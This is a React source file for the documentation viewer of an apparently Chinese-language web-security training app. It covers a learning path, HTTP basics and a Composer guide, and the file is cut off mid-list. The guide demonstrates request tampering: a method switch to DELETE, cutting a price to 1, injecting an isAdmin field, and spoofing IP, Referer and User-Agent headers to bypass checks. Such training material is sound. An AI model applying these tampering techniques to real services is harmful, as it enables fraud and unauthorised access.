
import React, { useState } from 'react';
import { Book, ChevronRight, ExternalLink, Lightbulb, Shield, Zap, Code2, Terminal, Play, Layers, PenTool } from 'lucide-react';

interface DocsViewerProps {
  onNavigateToLevel: (caseId: string) => void;
}

const DOCS_MENU = [
  {
    title: '🎯 学习路线',
    items: [
      { id: 'learning-path', title: '完整学习路线图' },
      { id: 'intro', title: '抓包技术简介' },
      { id: 'http-basics', title: 'HTTP 协议从零到精通' },
    ]
  },
  {
    title: '🛠️ 工具使用',
    items: [
      { id: 'devtools-vs-proxy', title: 'DevTools vs 抓包工具' },
      { id: 'reqable-interface', title: 'Reqable 界面详解' },
      { id: 'traffic-analysis', title: '流量分析实战' },
    ]
  },
  {
    title: '⚡ 核心功能',
    items: [
      { id: 'composer', title: 'Composer 完全指南' },
      { id: 'breakpoints', title: 'Breakpoints 断点调试' },
      { id: 'rewriting', title: '重写规则 (Rewrite Rules)' },
    ]
  },
  {
    title: '🔐 安全攻防',
    items: [
      { id: 'idor', title: 'IDOR 越权攻击' },
      { id: 'xss', title: 'XSS 跨站脚本' },
      { id: 'jwt', title: 'JWT 令牌攻击' },
      { id: 'sqli', title: 'SQL 注入基础' },
    ]
  },
  {
    title: '📚 进阶技巧',
    items: [
      { id: 'advanced-techniques', title: '高级抓包技巧' },
      { id: 'troubleshooting', title: '常见问题排查' },
      { id: 'best-practices', title: '最佳实践' },
    ]
  }
];

export const DocsViewer: React.FC<DocsViewerProps> = ({ onNavigateToLevel }) => {
  const [activeDoc, setActiveDoc] = useState('intro');
  const [isTransitioning, setIsTransitioning] = useState(false);

  const handleDocChange = (docId: string) => {
    if (docId === activeDoc) return;
    setIsTransitioning(true);
    setTimeout(() => {
      setActiveDoc(docId);
      setTimeout(() => setIsTransitioning(false), 10);
    }, 150);
  };

  const renderContent = () => {
    switch(activeDoc) {
      case 'learning-path':
        return (
          <div key="learning-path" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-4xl font-bold text-white mb-4">🎯 NetRunner 完整学习路线图</h1>
            <p className="text-lg text-gray-300 leading-relaxed">
              欢迎来到 NetRunner Academy！这是一条从零基础到网络安全专家的完整学习路径。无论你是前端开发者、后端工程师还是安全爱好者,都可以按照这个路线系统学习。
            </p>

            <div className="bg-gradient-to-r from-blue-900/30 to-purple-900/30 border border-blue-500/30 p-6 rounded-lg">
              <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
                <Lightbulb className="text-yellow-400" size={24}/>
                学习理念
              </h3>
              <ul className="space-y-2 text-gray-300">
                <li className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">✓</span>
                  <span><strong>实战驱动</strong> - 每个概念都配有实战关卡,边学边练</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">✓</span>
                  <span><strong>工具真实</strong> - 模拟器 1:1 还原真实工具,学完可直接上手</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">✓</span>
                  <span><strong>循序渐进</strong> - 从 HTTP 基础到高级渗透,难度螺旋上升</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">✓</span>
                  <span><strong>完全闭环</strong> - 本教程包含你需要的所有知识,无需外部资料</span>
                </li>
              </ul>
            </div>

            <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-blue-500 pb-3">📖 分阶段学习路线</h2>

            {/* 第一阶段 */}
            <div className="bg-[#0d1117] border-l-4 border-green-500 p-6 rounded-r-lg">
              <div className="flex items-center gap-3 mb-4">
                <div className="bg-green-500 text-black font-bold px-4 py-2 rounded-full text-lg">阶段 1</div>
                <h3 className="text-2xl font-bold text-white">网络基础入门 (1-2 天)</h3>
              </div>
              <p className="text-gray-400 mb-4">目标：理解互联网的通信机制,掌握 HTTP 协议基础</p>

              <div className="space-y-3">
                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Book size={16} className="text-blue-400"/>
                    <span className="font-bold text-white">必读文档</span>
                  </div>
                  <ul className="text-sm text-gray-300 space-y-1 ml-6">
                    <li>• 抓包技术简介</li>
                    <li>• HTTP 协议从零到精通</li>
                    <li>• DevTools vs 抓包工具</li>
                  </ul>
                </div>

                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Play size={16} className="text-green-400"/>
                    <span className="font-bold text-white">实战关卡</span>
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-sm ml-6">
                    <button onClick={() => onNavigateToLevel('case_01')} className="text-left text-blue-400 hover:text-blue-300 transition-colors">Case 01: API 协议分析 ⭐</button>
                    <button onClick={() => onNavigateToLevel('case_03')} className="text-left text-blue-400 hover:text-blue-300 transition-colors">Case 03: Console 调试 ⭐</button>
                  </div>
                </div>

                <div className="bg-green-900/20 border border-green-500/30 p-3 rounded">
                  <div className="text-sm text-green-300">
                    <strong>✓ 通关标准</strong>：能独立分析一个 HTTP 请求的所有组成部分 (Method, Headers, Body, Status Code)
                  </div>
                </div>
              </div>
            </div>

            {/* 第二阶段 */}
            <div className="bg-[#0d1117] border-l-4 border-blue-500 p-6 rounded-r-lg mt-8">
              <div className="flex items-center gap-3 mb-4">
                <div className="bg-blue-500 text-black font-bold px-4 py-2 rounded-full text-lg">阶段 2</div>
                <h3 className="text-2xl font-bold text-white">工具精通 (2-3 天)</h3>
              </div>
              <p className="text-gray-400 mb-4">目标：掌握 Reqable 的核心功能,能熟练使用 Composer 和 Breakpoints</p>

              <div className="space-y-3">
                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Book size={16} className="text-blue-400"/>
                    <span className="font-bold text-white">必读文档</span>
                  </div>
                  <ul className="text-sm text-gray-300 space-y-1 ml-6">
                    <li>• Reqable 界面详解</li>
                    <li>• 流量分析实战</li>
                    <li>• Composer 完全指南</li>
                    <li>• Breakpoints 断点调试</li>
                  </ul>
                </div>

                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Play size={16} className="text-green-400"/>
                    <span className="font-bold text-white">实战关卡</span>
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-sm ml-6">
                    <button onClick={() => onNavigateToLevel('case_02')} className="text-left text-blue-400 hover:text-blue-300 transition-colors">Case 02: 价格篡改 ⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_05')} className="text-left text-blue-400 hover:text-blue-300 transition-colors">Case 05: 批量删除 ⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_07')} className="text-left text-blue-400 hover:text-blue-300 transition-colors">Case 07: 断点拦截 ⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_08')} className="text-left text-blue-400 hover:text-blue-300 transition-colors">Case 08: 响应伪造 ⭐⭐</button>
                  </div>
                </div>

                <div className="bg-blue-900/20 border border-blue-500/30 p-3 rounded">
                  <div className="text-sm text-blue-300">
                    <strong>✓ 通关标准</strong>：能使用 Composer 构造任意请求,能使用断点实时修改流量
                  </div>
                </div>
              </div>
            </div>

            {/* 第三阶段 */}
            <div className="bg-[#0d1117] border-l-4 border-yellow-500 p-6 rounded-r-lg mt-8">
              <div className="flex items-center gap-3 mb-4">
                <div className="bg-yellow-500 text-black font-bold px-4 py-2 rounded-full text-lg">阶段 3</div>
                <h3 className="text-2xl font-bold text-white">安全攻防入门 (3-5 天)</h3>
              </div>
              <p className="text-gray-400 mb-4">目标：理解常见 Web 漏洞原理,学会基础的渗透测试技巧</p>

              <div className="space-y-3">
                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Book size={16} className="text-blue-400"/>
                    <span className="font-bold text-white">必读文档</span>
                  </div>
                  <ul className="text-sm text-gray-300 space-y-1 ml-6">
                    <li>• IDOR 越权攻击</li>
                    <li>• XSS 跨站脚本</li>
                    <li>• JWT 令牌攻击</li>
                    <li>• SQL 注入基础</li>
                  </ul>
                </div>

                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Play size={16} className="text-green-400"/>
                    <span className="font-bold text-white">实战关卡</span>
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-sm ml-6">
                    <button onClick={() => onNavigateToLevel('case_04')} className="text-left text-yellow-400 hover:text-yellow-300 transition-colors">Case 04: IDOR 简单版 ⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_06')} className="text-left text-yellow-400 hover:text-yellow-300 transition-colors">Case 06: 权限提升 ⭐⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_13')} className="text-left text-yellow-400 hover:text-yellow-300 transition-colors">Case 13: JWT None 算法 ⭐⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_15')} className="text-left text-yellow-400 hover:text-yellow-300 transition-colors">Case 15: WAF 绕过 ⭐⭐⭐</button>
                  </div>
                </div>

                <div className="bg-yellow-900/20 border border-yellow-500/30 p-3 rounded">
                  <div className="text-sm text-yellow-300">
                    <strong>✓ 通关标准</strong>：能独立识别和利用 IDOR、XSS、JWT 等常见漏洞
                  </div>
                </div>
              </div>
            </div>

            {/* 第四阶段 */}
            <div className="bg-[#0d1117] border-l-4 border-red-500 p-6 rounded-r-lg mt-8">
              <div className="flex items-center gap-3 mb-4">
                <div className="bg-red-500 text-white font-bold px-4 py-2 rounded-full text-lg">阶段 4</div>
                <h3 className="text-2xl font-bold text-white">高级渗透技巧 (5-7 天)</h3>
              </div>
              <p className="text-gray-400 mb-4">目标：掌握高级绕过技巧,能进行复杂的安全审计</p>

              <div className="space-y-3">
                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Book size={16} className="text-blue-400"/>
                    <span className="font-bold text-white">必读文档</span>
                  </div>
                  <ul className="text-sm text-gray-300 space-y-1 ml-6">
                    <li>• 高级抓包技巧</li>
                    <li>• 重写规则 (Rewrite Rules)</li>
                    <li>• 常见问题排查</li>
                    <li>• 最佳实践</li>
                  </ul>
                </div>

                <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                  <div className="flex items-center gap-2 mb-2">
                    <Play size={16} className="text-green-400"/>
                    <span className="font-bold text-white">实战关卡</span>
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-sm ml-6">
                    <button onClick={() => onNavigateToLevel('case_09')} className="text-left text-red-400 hover:text-red-300 transition-colors">Case 09: 批量越权 ⭐⭐⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_10')} className="text-left text-red-400 hover:text-red-300 transition-colors">Case 10: 时间盲注 ⭐⭐⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_14')} className="text-left text-red-400 hover:text-red-300 transition-colors">Case 14: Regex DoS ⭐⭐⭐⭐</button>
                    <button onClick={() => onNavigateToLevel('case_16')} className="text-left text-red-400 hover:text-red-300 transition-colors">Case 16: 综合挑战 ⭐⭐⭐⭐⭐</button>
                  </div>
                </div>

                <div className="bg-red-900/20 border border-red-500/30 p-3 rounded">
                  <div className="text-sm text-red-300">
                    <strong>✓ 通关标准</strong>：能进行完整的渗透测试,发现并利用复杂的逻辑漏洞组合
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-gradient-to-r from-purple-900/30 to-pink-900/30 border border-purple-500/30 p-6 rounded-lg mt-12">
              <h3 className="text-2xl font-bold text-white mb-4">🎓 学完之后你将掌握</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-gray-300">
                <div className="flex items-start gap-2">
                  <span className="text-green-400 text-xl mt-1">✓</span>
                  <div>
                    <div className="font-bold">HTTP/HTTPS 协议专家</div>
                    <div className="text-sm text-gray-400">深入理解请求响应机制、状态码、Headers</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 text-xl mt-1">✓</span>
                  <div>
                    <div className="font-bold">抓包工具精通</div>
                    <div className="text-sm text-gray-400">熟练使用 Reqable/Charles/Fiddler</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 text-xl mt-1">✓</span>
                  <div>
                    <div className="font-bold">Web 安全漏洞挖掘</div>
                    <div className="text-sm text-gray-400">IDOR、XSS、JWT、SQL 注入等</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 text-xl mt-1">✓</span>
                  <div>
                    <div className="font-bold">渗透测试方法论</div>
                    <div className="text-sm text-gray-400">系统化的安全审计流程</div>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-blue-900/20 border-l-4 border-blue-500 p-6 rounded-r mt-8">
              <h4 className="text-blue-400 font-bold mb-3 flex items-center gap-2">
                <Lightbulb size={20}/>
                学习建议
              </h4>
              <ul className="space-y-2 text-gray-300 text-sm">
                <li>📌 <strong>每天 1-2 小时</strong> - 持续学习比一次性突击更有效</li>
                <li>📌 <strong>先文档后实战</strong> - 每个关卡前先阅读对应文档,理解原理</li>
                <li>📌 <strong>做笔记总结</strong> - 记录每个漏洞的特征和利用方法</li>
                <li>📌 <strong>复习巩固</strong> - 定期回顾已完成的关卡,加深记忆</li>
                <li>📌 <strong>遵守法律</strong> - 只在授权环境中测试,切勿用于非法用途</li>
              </ul>
            </div>

            <div className="mt-12 text-center">
              <button
                onClick={() => handleDocChange('intro')}
                className="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white px-8 py-4 rounded-lg font-bold text-lg flex items-center gap-3 mx-auto transition-all transform hover:scale-105"
              >
                <Play size={24} />
                开始学习第一章：抓包技术简介
                <ChevronRight size={24} />
              </button>
            </div>
          </div>
        );

      case 'intro':
        return (
          <div key="intro" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-4xl font-bold text-white mb-4">网络抓包技术简介</h1>
            <p className="text-lg text-gray-300 leading-relaxed">
              网络抓包 (Network Sniffing) 是指捕获并检查网络上流动的数据包的技术。对于前端工程师和安全研究员来说，这通常特指分析浏览器与服务器之间的 <strong>HTTP/HTTPS 流量</strong>。
            </p>
            
            <div className="bg-blue-900/20 border-l-4 border-blue-500 p-4 rounded-r">
              <h3 className="text-blue-400 font-bold flex items-center gap-2 mb-2"><Lightbulb size={18}/> 为什么要学抓包？</h3>
              <ul className="list-disc pl-5 space-y-1 text-gray-300">
                <li><strong>故障排查 (Debugging):</strong> 精确了解前端发送了什么数据，后端返回了什么错误。</li>
                <li><strong>安全审计 (Security):</strong> 发现敏感数据泄露、越权访问 (IDOR) 和认证缺陷。</li>
                <li><strong>逆向工程 (Reverse Engineering):</strong> 分析第三方未公开的 API 接口逻辑。</li>
              </ul>
            </div>

            <h2 className="text-2xl font-bold text-white mt-8 border-b border-gray-700 pb-2">NetRunner 模拟系统</h2>
            <p className="text-gray-300">
              NetRunner 提供了一个虚拟的操作系统环境，你可以同时使用两种核心工具：
            </p>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
               <div className="bg-[#252526] p-4 rounded border border-[#333]">
                  <div className="flex items-center gap-2 text-blue-400 font-bold mb-2"><Terminal size={16}/> Chrome DevTools</div>
                  <p className="text-sm text-gray-400">擅长查看 DOM 结构、Console 日志和基础的网络请求查看。</p>
               </div>
               <div className="bg-[#252526] p-4 rounded border border-[#333]">
                  <div className="flex items-center gap-2 text-yellow-400 font-bold mb-2"><Zap size={16}/> Reqable 模拟器</div>
                  <p className="text-sm text-gray-400">系统级代理工具。擅长高级拦截、断点调试、请求重写和脚本自动化。</p>
               </div>
            </div>
            
            <h2 className="text-2xl font-bold text-white mt-8 border-b border-gray-700 pb-2">HTTP 基础概念</h2>

            <h3 className="text-xl font-bold text-blue-400 mt-6">什么是 HTTP？</h3>
            <p className="text-gray-300">
              <strong>HTTP (HyperText Transfer Protocol)</strong> 是超文本传输协议，是互联网上应用最广泛的网络协议。它定义了客户端（通常是浏览器）和服务器之间如何交换数据。
            </p>

            <div className="bg-[#1e1e1e] p-4 rounded border border-gray-700 mt-4">
              <h4 className="text-white font-bold mb-3">HTTP 请求-响应模型</h4>
              <pre className="text-sm text-gray-300 font-mono">
{`客户端 (Browser)          服务器 (Server)
     |                         |
     |  ---- HTTP 请求 ---->   |
     |  GET /api/users         |
     |                         |
     |  <--- HTTP 响应 ----    |
     |  200 OK                 |
     |  {"users": [...]}       |`}
              </pre>
            </div>

            <h3 className="text-xl font-bold text-blue-400 mt-6">HTTP 请求的组成部分</h3>
            <div className="space-y-4 mt-4">
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">1. 请求行 (Request Line)</div>
                <code className="text-green-400 text-sm">GET /api/products?category=laptop HTTP/1.1</code>
                <ul className="list-disc pl-5 mt-2 text-gray-400 text-sm space-y-1">
                  <li><strong>方法 (Method):</strong> GET, POST, PUT, DELETE, PATCH 等</li>
                  <li><strong>路径 (Path):</strong> /api/products</li>
                  <li><strong>查询参数 (Query):</strong> ?category=laptop</li>
                  <li><strong>协议版本:</strong> HTTP/1.1 或 HTTP/2</li>
                </ul>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">2. 请求头 (Request Headers)</div>
                <pre className="text-green-400 text-sm font-mono">
{`Host: api.example.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Authorization: Bearer eyJhbGc...`}
                </pre>
                <p className="text-gray-400 text-sm mt-2">
                  Headers 包含元数据，如认证令牌、内容类型、浏览器信息等。
                </p>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">3. 请求体 (Request Body)</div>
                <pre className="text-green-400 text-sm font-mono">
{`{
  "username": "alice",
  "email": "alice@example.com"
}`}
                </pre>
                <p className="text-gray-400 text-sm mt-2">
                  只有 POST、PUT、PATCH 等方法才有 Body，用于提交数据。
                </p>
              </div>
            </div>

            <h3 className="text-xl font-bold text-blue-400 mt-6">HTTP 响应的组成部分</h3>
            <div className="space-y-4 mt-4">
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">1. 状态行 (Status Line)</div>
                <code className="text-yellow-400 text-sm">HTTP/1.1 200 OK</code>
                <ul className="list-disc pl-5 mt-2 text-gray-400 text-sm space-y-1">
                  <li><span className="text-green-400">200 OK</span> - 请求成功</li>
                  <li><span className="text-yellow-400">301 Moved Permanently</span> - 资源已永久移动</li>
                  <li><span className="text-red-400">403 Forbidden</span> - 无权限访问</li>
                  <li><span className="text-red-400">404 Not Found</span> - 资源不存在</li>
                  <li><span className="text-red-500">500 Internal Server Error</span> - 服务器错误</li>
                </ul>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">2. 响应头 (Response Headers)</div>
                <pre className="text-yellow-400 text-sm font-mono">
{`Content-Type: application/json
Content-Length: 1234
Set-Cookie: session=abc123; HttpOnly`}
                </pre>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">3. 响应体 (Response Body)</div>
                <pre className="text-yellow-400 text-sm font-mono">
{`{
  "success": true,
  "data": { "userId": 42 }
}`}
                </pre>
              </div>
            </div>

            <div className="bg-yellow-900/20 border-l-4 border-yellow-500 p-4 rounded-r mt-6">
              <h4 className="text-yellow-400 font-bold mb-2">⚠️ HTTPS vs HTTP</h4>
              <p className="text-gray-300 text-sm">
                <strong>HTTPS</strong> 是 HTTP 的加密版本，使用 TLS/SSL 加密传输数据。在现代网络中，几乎所有网站都使用 HTTPS。抓包工具（如 Reqable）需要安装证书才能解密 HTTPS 流量。
              </p>
            </div>

            <div className="mt-8">
               <button onClick={() => onNavigateToLevel('case_01')} className="bg-blue-600 hover:bg-blue-500 text-white px-6 py-3 rounded-lg font-bold flex items-center gap-2 transition-colors">
                  <Play size={18} /> 开始第一课：API 协议分析
               </button>
            </div>
          </div>
        );
      
      case 'devtools-vs-proxy':
         return (
            <div key="devtools-vs-proxy" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
               <h1 className="text-3xl font-bold text-white">DevTools vs 专业抓包工具</h1>
               <p className="text-gray-300">
                  初学者常见的问题是：<em>"既然我有 Chrome 自带的 Network 面板，为什么还需要 Reqable / Charles / Fiddler？"</em>
               </p>
               
               <table className="w-full text-left border-collapse mt-4">
                  <thead>
                     <tr className="border-b border-gray-700 text-gray-400 text-sm uppercase">
                        <th className="py-2">功能特性</th>
                        <th className="py-2 text-blue-400">Chrome DevTools</th>
                        <th className="py-2 text-yellow-400">Reqable / Proxy</th>
                     </tr>
                  </thead>
                  <tbody className="text-gray-300 text-sm">
                     <tr className="border-b border-gray-800"><td className="py-3 font-bold">可视范围</td><td className="py-3">仅当前浏览器标签页</td><td className="py-3">系统全局 (App, 小程序, 所有浏览器)</td></tr>
                     <tr className="border-b border-gray-800"><td className="py-3 font-bold">请求修改</td><td className="py-3">有限 (仅支持重放 Fetch/XHR)</td><td className="py-3">完全控制 (修改 Body, Header, Method)</td></tr>
                     <tr className="border-b border-gray-800"><td className="py-3 font-bold">拦截能力</td><td className="py-3">无 (只读模式)</td><td className="py-3">支持断点 (Breakpoints) 暂停请求</td></tr>
                     <tr className="border-b border-gray-800"><td className="py-3 font-bold">脚本扩展</td><td className="py-3">JS 控制台</td><td className="py-3">Python/JS 中间件脚本</td></tr>
                  </tbody>
               </table>
            </div>
         );

      case 'composer':
         return (
            <div key="composer" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
               <h1 className="text-3xl font-bold text-white flex items-center gap-3">
                  <PenTool className="text-yellow-400"/> API 构造器 (Composer)
               </h1>
               <p className="text-gray-300">
                  <strong>Composer</strong> 是你的实验台。它允许你"凭空"构造 HTTP 请求，或者基于已捕获的请求进行"篡改"和"重发"。这是安全测试和 API 调试的核心工具。
               </p>

               <div className="bg-yellow-900/20 border-l-4 border-yellow-500 p-4 rounded-r mt-4">
                 <h4 className="text-yellow-400 font-bold mb-2">🎯 为什么需要 Composer？</h4>
                 <p className="text-gray-300 text-sm">
                   前端界面通常有各种限制（如输入框验证、按钮禁用），但这些限制只存在于浏览器中。通过 Composer，你可以绕过这些前端限制，直接向服务器发送任意请求，测试后端是否有足够的安全验证。
                 </p>
               </div>

               <h2 className="text-2xl font-bold text-white mt-8 border-b border-gray-700 pb-2">核心能力</h2>

               <div className="space-y-4 mt-6">
                 <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                   <div className="font-bold text-white mb-3 flex items-center gap-2">
                     <span className="bg-yellow-600 text-black px-2 py-1 rounded text-xs">1</span>
                     方法篡改 (Method Tampering)
                   </div>
                   <p className="text-gray-400 text-sm mb-3">
                     HTTP 方法定义了操作的类型。前端可能只允许 GET，但你可以改为 DELETE、PUT 等，测试后端是否检查了方法权限。
                   </p>
                   <div className="bg-[#0d1117] p-3 rounded">
                     <div className="text-gray-500 text-xs mb-1">原始请求（前端发送）</div>
                     <code className="text-green-400 text-sm">GET /api/users/123</code>
                     <div className="text-gray-500 text-xs mt-3 mb-1">修改后（Composer 发送）</div>
                     <code className="text-red-400 text-sm">DELETE /api/users/123</code>
                   </div>
                   <div className="mt-3 text-yellow-400 text-sm">
                     ⚠️ 如果后端没有验证方法权限，你可能成功删除数据！
                   </div>
                 </div>

                 <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                   <div className="font-bold text-white mb-3 flex items-center gap-2">
                     <span className="bg-yellow-600 text-black px-2 py-1 rounded text-xs">2</span>
                     载荷伪造 (Payload Crafting)
                   </div>
                   <p className="text-gray-400 text-sm mb-3">
                     手动编写请求体（Body），绕过前端的表单验证。例如，前端限制价格最低100元，但你可以直接发送 <code>price: 1</code>。
                   </p>
                   <div className="bg-[#0d1117] p-3 rounded font-mono text-xs">
                     <div className="text-gray-500 mb-1">前端限制：价格 ≥ 100</div>
                     <pre className="text-green-400">
{`// 前端发送
{
  "productId": 12345,
  "quantity": 1,
  "price": 100  // 最低限制
}`}
                     </pre>
                     <div className="text-gray-500 mt-3 mb-1">Composer 绕过：</div>
                     <pre className="text-yellow-400">
{`// Composer 发送
{
  "productId": 12345,
  "quantity": 1,
  "price": 1  // 仅 1 元！
}`}
                     </pre>
                   </div>
                   <div className="mt-3 text-yellow-400 text-sm">
                     ⚠️ 这是 Case 02「价格篡改」的核心技巧！
                   </div>
                 </div>

                 <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                   <div className="font-bold text-white mb-3 flex items-center gap-2">
                     <span className="bg-yellow-600 text-black px-2 py-1 rounded text-xs">3</span>
                     参数注入 (Parameter Injection)
                   </div>
                   <p className="text-gray-400 text-sm mb-3">
                     在 URL 查询参数或请求体中添加额外的字段，测试后端是否有意外的隐藏参数。
                   </p>
                   <div className="bg-[#0d1117] p-3 rounded">
                     <div className="text-gray-500 text-xs mb-1">原始请求</div>
                     <code className="text-green-400 text-sm">POST /api/checkout</code>
                     <pre className="text-green-400 text-sm mt-2">
{`{
  "productId": 123,
  "coupon": "SAVE10"
}`}
                     </pre>
                     <div className="text-gray-500 text-xs mt-3 mb-1">注入隐藏参数</div>
                     <pre className="text-yellow-400 text-sm">
{`{
  "productId": 123,
  "coupon": "SAVE10",
  "isAdmin": true,        // 尝试提升权限
  "discount": 90          // 尝试自定义折扣
}`}
                     </pre>
                   </div>
                 </div>

                 <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                   <div className="font-bold text-white mb-3 flex items-center gap-2">
                     <span className="bg-yellow-600 text-black px-2 py-1 rounded text-xs">4</span>
                     头注入 (Header Injection)
                   </div>
                   <p className="text-gray-400 text-sm mb-3">
                     添加或修改 HTTP Headers，伪造身份或绕过限制。
                   </p>
                   <div className="space-y-3">
                     <div className="bg-[#0d1117] p-2 rounded">
                       <div className="text-xs text-gray-500">伪造 IP 地址</div>
                       <code className="text-yellow-400 text-sm">X-Forwarded-For: 192.168.1.100</code>
                       <div className="text-xs text-gray-400 mt-1">用途：绕过 IP 黑名单/白名单</div>
                     </div>
                     <div className="bg-[#0d1117] p-2 rounded">
                       <div className="text-xs text-gray-500">伪造请求来源</div>
                       <code className="text-yellow-400 text-sm">Referer: https://trusted-site.com</code>
                       <div className="text-xs text-gray-400 mt-1">用途：绕过防盗链检测</div>
                     </div>
                     <div className="bg-[#0d1117] p-2 rounded">
                       <div className="text-xs text-gray-500">修改用户代理</div>
                       <code className="text-yellow-400 text-sm">User-Agent: Googlebot/2.1</code>
                       <div className="text-xs text-gray-400 mt-1">用途：伪装成搜索引擎爬虫</div>
                     </div>
                   </div>
                 </div>
               </div>

               <h2 className="text-2xl font-bold text-white mt-8 border-b border-gray-700 pb-2">使用步骤详解</h2>

               <div className="bg-[#1e1e1e] p-6 rounded border border-gray-700 mt-6">
                 <h4 className="text-white font-bold mb-4">📝 标准 Composer 工作流</h4>

                 <div className="space-y-4">
                   <div className="flex gap-4">
                     <div className="flex-shrink-0 w-8 h-8 bg-yellow-600 text-black rounded-full flex items-center justify-center font-bold">1</div>
                     <div>
                       <div className="font-bold text-white mb-1">捕获原始请求</div>
                       <p className="text-sm text-gray-400">在 Reqable 流量列表中找到目标请求（如提交订单的 POST 请求），右键选择「发送到 Composer」。</p>
                     </div>
                   </div>

                   <div className="flex gap-4">
                     <div className="flex-shrink-0 w-8 h-8 bg-yellow-600 text-black rounded-full flex items-center justify-center font-bold">2</div>
                     <div>
                       <div className="font-bold text-white mb-1">修改请求内容</div>
                       <p className="text-sm text-gray-400">在 Composer 界面中修改：</p>
                       <ul className="list-disc pl-5 text-sm text-gray-400 mt-2 space-y-1">
                         <li>HTTP 方法（GET → POST → DELETE）</li>
                         <li>URL 参数（<code>?userId=123</code> → <code>?userId=456</code>）</li>
                         <li>Headers（添加 <code>Authorization</code>、<code>X-Forwarded-For</code> 等）</li>
                         <li>请求体（修改 JSON 字段值）</li>
                       </ul>
                     </div>
                   </div>

                   <div className="flex gap-4">
                     <div className="flex-shrink-0 w-8 h-8 bg-yellow-600 text-black rounded-full flex items-center justify-center font-bold">3</div>
                     <div>
                       <div className="font-bold text-white mb-1">发送请求</div>
                       <p className="text-sm text-gray-400">点击「Send」按钮，向服务器发送修改后的请求。</p>
                     </div>
                   </div>

                   <div className="flex gap-4">
                     <div className="flex-shrink-0 w-8 h-8 bg-yellow-600 text-black rounded-full flex items-center justify-center font-bold">4</div>
                     <div>
                       <div className="font-bold text-white mb-1">分析响应</div>
                       <p className="text-sm text-gray-400">查看服务器返回的状态码和响应体：</p>
                       <ul className="list-disc pl-5 text-sm text-gray-400 mt-2 space-y-1">
                         <li><span className="text-green-400">200 OK</span> - 请求成功，漏洞可能存在</li>
                         <li><span className="text-red-400">403 Forbidden</span> - 被拦截，后端有验证</li>
                         <li><span className="text-red-400">400 Bad Request</span> - 参数格式错误</li>
                       </ul>
                     </div>
                   </div>

                   <div className="flex gap-4">
                     <div className="flex-shrink-0 w-8 h-8 bg-yellow-600 text-black rounded-full flex items-center justify-center font-bold">5</div>
                     <div>
                       <div className="font-bold text-white mb-1">迭代测试</div>
                       <p className="text-sm text-gray-400">根据响应调整请求，重复步骤 2-4，直到找到漏洞或确认安全。</p>
                     </div>
                   </div>
                 </div>
               </div>

               <div className="bg-blue-900/20 border-l-4 border-blue-500 p-4 rounded-r mt-6">
                 <h4 className="text-blue-400 font-bold mb-2">💡 实战建议</h4>
                 <ul className="text-sm text-gray-300 space-y-2">
                   <li>✅ <strong>先观察再修改</strong> - 先用原始请求测试，确保能成功，再开始修改</li>
                   <li>✅ <strong>小步快跑</strong> - 每次只改一个参数，方便定位问题</li>
